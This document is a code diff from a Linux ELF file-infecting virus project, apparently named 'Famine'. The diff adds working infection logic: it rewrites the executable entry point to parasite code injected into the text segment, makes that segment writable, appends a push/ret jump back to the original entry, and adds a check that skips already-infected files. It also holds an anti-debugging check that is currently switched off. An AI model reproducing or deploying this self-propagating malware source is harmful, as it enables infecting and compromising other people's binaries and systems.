@@ -40,7 +40,7 @@ struct linux_dirent64 {
  int do_the_job(char file[],size_t size, char *path);
  int             ft_strncmp(const char *s1, const char *s2, size_t n);
  int infect(char path[],size_t path_length);
- void new_file(char buf[],size_t size, size_t end_of_text,char *path);
+ void new_file(char buf[],size_t size, size_t end_of_text,char *path,Elf64_Addr old_e_entry);
  void	ft_putnbr(int nb);
  void		ft_putstr(char *s);
  int		ft_putchar(int c);
@@ -54,7 +54,7 @@ struct linux_dirent64 {
  char            *ft_strnstr(char *s1, char *s2, size_t n);
  int             ft_strcmp(const char *s1, const char *s2);
 
-#define PAGE_SIZE (4096 *2)
+#define PAGE_SIZE (4096 *3)
 
 # define __syscall0(type,name)          \
 type name(void)                         \
@@ -127,12 +127,17 @@ _start()
 	        "jmp myend\n");
 
 }
+__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count); // poura etre decalle apres (used for debug)
+
 
 int do_main(void)
 {
+	write(1,"1",1);
 	pid_t pid;
 	void *start;
 	size_t size;
+
+
 	if (process_runing())
 		return (1);
 
@@ -154,7 +159,6 @@ __syscall1(void, exit, int, status);
 __syscall2(int, rename, const char *, old, const char *, new);
 __syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
 __syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
-__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count); // poura etre decalle apres (used for debug)
 __syscall3(int, getdents64, unsigned int, fd, struct linux_dirent64*, dirp,  unsigned int, count);
 
 bool process_runing(void)
@@ -177,7 +181,7 @@ bool process_runing(void)
 			TracerPid += 10;
 			while(*TracerPid == '\t' || *TracerPid == ' ')
 				TracerPid++;
-			if (*TracerPid != '0' && *TracerPid != '\n')
+			if (*TracerPid != '0' && *TracerPid != '\n' && 0) // enlever le 0 pour gdb
 				exit(1);
 		}
 
@@ -577,25 +581,13 @@ __syscall2(int, fstat, int, fildes, struct stat * , buf);
 	ft_putstr("1.1\n");
 
 	header = (Elf64_Ehdr *)buff;
-	seg = (Elf64_Phdr*)(buff + header->e_phoff);
+	 if(is_infected(buff))
+	 {
+	 	ft_putstr("deja infected\n");
+		 return (1);
 
-	for (i = header->e_phnum; i-- > 0; seg++)
-	{
-		if (seg->p_type == PT_LOAD)
-		{
-			if (seg->p_flags == (PF_R | PF_X))
-			{
+	 }
 
-				unsigned int pt = (PAGE_SIZE - 4) - parasite_size; // remplacer le 4 par la size de la signature
-
-				//la c est le check de la signature
-				// seg->p_offset + seg->p_filesz + pt
-
-				if ("equal" && 0)
-					return 1;
-			}
-		}
-	}
 	ft_putstr("2\n");
 
 	//Recupere le premier segement TEXT on lui rajoute 4096
@@ -616,17 +608,18 @@ __syscall2(int, fstat, int, fildes, struct stat * , buf);
 			if (seg->p_flags == (PF_R | PF_X))
 			{
 				seg->p_flags |= PF_W;
-				//seg->p_flags |= PF_W;
 				text = seg->p_vaddr;
 				parasite_vaddr = seg->p_vaddr + seg->p_filesz;
 
 				old_e_entry = header->e_entry;
-				//header->e_entry = parasite_vaddr;
+				header->e_entry = parasite_vaddr;
 				end_of_text = seg->p_offset + seg->p_filesz;
-
 				seg->p_filesz += parasite_size;
 				seg->p_memsz += parasite_size;
 				text_found++;
+				ft_putnbr(parasite_vaddr);
+				ft_putstr("\n");
+				ft_putnbr(end_of_text);
 			}
 		}
 	}
@@ -644,11 +637,11 @@ __syscall2(int, fstat, int, fildes, struct stat * , buf);
 			sec->sh_size += parasite_size;
 	}
 	header->e_shoff += PAGE_SIZE;
-	new_file(buff,size,end_of_text, path);
+	new_file(buff,size,end_of_text, path,old_e_entry);
 	ft_putstr("fim do_the_job\n");
 	return 0;
 }
- int infect(char path[],size_t path_length)
+int infect(char path[],size_t path_length)
 {
 	size_t i = 0;
 
@@ -689,14 +682,20 @@ __syscall2(int, fstat, int, fildes, struct stat * , buf);
 	}
 	return (line);
 }
- void new_file(char buf[],size_t size, size_t end_of_text,char *path)
+ void new_file(char buf[],size_t size, size_t end_of_text,char *path,Elf64_Addr old_e_entry)
 {
 	int fd;
-	char *data;
 	char tmp[125];
-	const char needle[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' ','0','0','0','0','0','0','0','0'};
-	unsigned int parasite_size = (char *)&myend - (char *)&real_start;
+	unsigned int parasite_size = ((char *)&myend - (char *)&real_start )+ 7;
+	char jmp_code[7];
 
+	jmp_code[0] = '\x68'; /* push */
+	jmp_code[1] = '\x00'; /* 00 */
+	jmp_code[2] = '\x00'; /* 00	*/
+	jmp_code[3] = '\x00'; /* 00	*/
+	jmp_code[4] = '\x00'; /* 00	*/
+	jmp_code[5] = '\xc3'; /* ret */
+	jmp_code[6] = 0;
 
 
 	ft_putstr("new_file debut ");
@@ -721,23 +720,32 @@ __syscall2(int, fstat, int, fildes, struct stat * , buf);
 	///write(fd,buff,file->size + PAGE_SIZE);
 
 	write(fd,buf, end_of_text);
+	ft_putstr("old entry ");
+	ft_putnbr(old_e_entry);
+	ft_putstr("\n");
+	*(unsigned long *) &jmp_code[1] = old_e_entry;
 	//write(fd,needle, 62);
 	ft_putstr("parazite size :");
 	ft_putnbr(parasite_size);
 	ft_putstr("\n");
 	ft_putstr("put_sig\n");
 	put_sig(fd);
+
+
+
 	unsigned long address_of_mai2 = get_eip() - ((char *)&yeah - (char *)&do_main);
 
-	write(fd,(char *) address_of_mai2,parasite_size);
+	write(fd,(char *) address_of_mai2,parasite_size - 7);
+
+
+
+
+	write(fd,jmp_code,7);
 	ft_putstr("end_put_sig\n");
 	for (int i = 0; i< PAGE_SIZE - 62-parasite_size;i++)
 		write(fd,"j",1);
 
 	write(fd,buf + end_of_text, size - end_of_text);
-	//ft_memmove(data,file->data, end_of_text);
-	//ft_memmove(data + PAGE_SIZE + end_of_text,file->data + end_of_text, file->size - end_of_text);
-	write(1,data, 15);
 	ft_putstr("tmp ");
 	ft_putstr(tmp);
 	ft_putstr(", path ");
@@ -787,12 +795,20 @@ __syscall2(int, fstat, int, fildes, struct stat * , buf);
 
 	i = 0;
 	header = (Elf64_Ehdr *)data;
-	while(sig[i])
+	ft_putstr("enter infected\n");
+		while(sig[i])
 	{
-		if (sig[i] !=  *((char *)(header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
+		ft_putnbr(i);
+		if (sig[i] !=  *((char *)(data + header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
+		{
+
 			return(0);
+
+		}
 		i++;
 	}
+	ft_putstr("ret 1\n");
+
 	return(1);
 }
 
@@ -853,13 +869,13 @@ unsigned long get_eip(void)
 	__asm__("call yeah\n"
 	        ".globl yeah\n"
 	        "yeah:\n"
-	        "pop %eax");
+	        "popq %rax");
 }
 void end_code() {
 __asm__(".globl myend\n"
         "myend:	     \n"
-        "mov $1,%eax \n"
-        "mov $0,%ebx \n"
+        "mov $1,%rax \n"
+        "mov $0,%rbx \n"
         "int $0x80   \n");
 
 }
